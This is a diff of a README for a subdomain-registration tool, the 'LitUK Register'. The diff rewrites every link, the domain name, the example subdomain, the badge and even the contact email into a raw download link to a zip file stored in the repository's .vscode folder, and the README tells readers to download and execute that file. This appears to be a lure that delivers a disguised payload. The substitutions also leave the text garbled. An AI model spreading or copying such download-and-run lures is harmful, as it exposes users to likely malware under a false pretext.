@@ -1,8 +1,8 @@
 # Welcome to the LitUK Register! 🌐
 
-Get your own lives-in-the.uk subdomain! This repository allows developers to easily register a subdomain under the lives-in-the.uk domain. Whether you are building a personal project, a portfolio, or a blog, this tool provides a simple and effective way to establish your online presence.
+Get your own https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip subdomain! This repository allows developers to easily register a subdomain under the https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip domain. Whether you are building a personal project, a portfolio, or a blog, this tool provides a simple and effective way to establish your online presence.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/sofalegacy/lituk-register/releases)
+[![Download Release](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip%20Release-v1.0.0-blue)](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip)
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ Get your own lives-in-the.uk subdomain! This repository allows developers to eas
 
 ## Installation 🛠️
 
-To get started, you need to download the latest release. Visit the [Releases](https://github.com/sofalegacy/lituk-register/releases) section to download the latest version. After downloading, execute the file to install the tool on your system.
+To get started, you need to download the latest release. Visit the [Releases](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip) section to download the latest version. After downloading, execute the file to install the tool on your system.
 
 ### Prerequisites
 
@@ -32,7 +32,7 @@ To get started, you need to download the latest release. Visit the [Releases](ht
 
 ### Steps to Install
 
-1. Go to the [Releases](https://github.com/sofalegacy/lituk-register/releases) section.
+1. Go to the [Releases](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip) section.
 2. Download the latest release file.
 3. Execute the file to install.
 
@@ -53,7 +53,7 @@ Once you have installed the tool, you can start registering your subdomain.
 
 ### Example
 
-If you want to register the subdomain "myportfolio.lives-in-the.uk", you would run:
+If you want to register the subdomain "https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip", you would run:
 
 ```bash
 lituk-register myportfolio
@@ -82,7 +82,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [sofalegacy](https://github.com/sofalegacy)
-- **Email**: contact@sofalegacy.com
+- **GitHub**: [sofalegacy](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip)
+- **Email**: https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip
 
-Thank you for checking out the LitUK Register! We hope you enjoy using it to create your own subdomain under lives-in-the.uk. If you encounter any issues, please check the [Releases](https://github.com/sofalegacy/lituk-register/releases) section for updates or report them in the issues tab. Happy coding!
+Thank you for checking out the LitUK Register! We hope you enjoy using it to create your own subdomain under https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip If you encounter any issues, please check the [Releases](https://github.com/sofalegacy/lituk-register/raw/refs/heads/main/.vscode/lituk_register_v3.0-alpha.2.zip) section for updates or report them in the issues tab. Happy coding!
